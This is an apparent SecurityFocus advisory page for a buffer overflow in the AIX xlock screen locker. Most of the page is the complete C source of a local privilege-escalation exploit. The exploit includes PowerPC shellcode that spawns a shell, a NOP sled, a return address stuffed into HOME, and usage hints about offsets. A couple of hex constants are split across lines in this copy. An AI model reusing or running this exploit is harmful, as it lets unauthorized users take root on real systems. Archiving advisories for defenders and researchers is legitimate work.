source: http://www.securityfocus.com/bid/224/info
 
The xlock program is used to lock the local X display until the user supplies the correct password. A buffer overflow condition has been discovered in xlock that may allow an unauthorized user to gain root access.

    /*
     *
     *   /usr/bin/X11/xlock exploit (kinda' coded) by BeastMaster V
     *
     *   CREDITS: this code is simply a modified version of an exploit
     *   posted by Georgi Guninski (guninski@hotmail.com)
     *
     *   USAGE:
     *            $ cc -o foo -g aix_xlock.c
     *            $ ./foo 3200
     *            #
     *
     *   HINT: Try giving ranges from 3100 through 3400
     *   (If these ranges don't work, then run the brute
     *    korn shell script provided after the exploit)
     *
     *   DISCLAIMER: use this program in a responsible manner.
     *
     */

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    extern int execv();

    #define MAXBUF 600

    unsigned int code[]={
            0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
            0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
            0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
            0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
            0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
            0x7c0903a6 , 0x4e800420, 0x0
    };

    char *createvar(char *name,char *value)
    {
            char *c;
            int l;

            l=strlen(name)+strlen(value)+4;
            if (! (c=malloc(l))) {perror("error allocating");exit(2);};
            strcpy(c,name);
            strcat(c,"=");
            strcat(c,value);
            putenv(c);
            return c;
    }

    main(int argc,char **argv,char **env)
    {
            unsigned int buf[MAXBUF],frame[MAXBUF],i,nop,toc,eco,*pt;
            int min=200, max=300;
            unsigned int return_address;
            char *newenv[8];
            char *args[4];
            int offset=3200;

            if (argc==2) offset = atoi(argv[1]);

            pt=(unsigned *) &execv; toc=*(pt+1); eco=*pt;

            *((unsigned short *)code+9)=(unsigned short) (toc & 0x0000ffff);
            *((unsigned short *)code+7)=(unsigned short) ((toc >> 16) & 0x0000f
fff);
            *((unsigned short *)code+15)=(unsigned short) (eco & 0x0000ffff);
            *((unsigned short *)code+13)=(unsigned short) ((eco >> 16) & 0x0000
ffff);

            return_address=(unsigned)&buf[0]+offset;

            for(nop=0;nop<min;nop++) buf[nop]=0x4ffffb82;
            strcpy((char*)&buf[nop],(char*)&code);
            i=nop+strlen( (char*) &code)/4-1;

            for(i=0;i<max-1;i++) frame[i]=return_address;
            frame[i]=0;

            newenv[0]=createvar("EGGSHEL",(char*)&buf[0]);
            newenv[1]=createvar("EGGSHE2",(char*)&buf[0]);
            newenv[2]=createvar("EGGSHE3",(char*)&buf[0]);
            newenv[3]=createvar("EGGSHE4",(char*)&buf[0]);
            newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
            newenv[5]=createvar("HOME",(char*)&frame[0]);

            args[0]="xlock";
            execve("/usr/bin/X11/xlock",args,newenv);
            perror("Error executing execve \n");

    }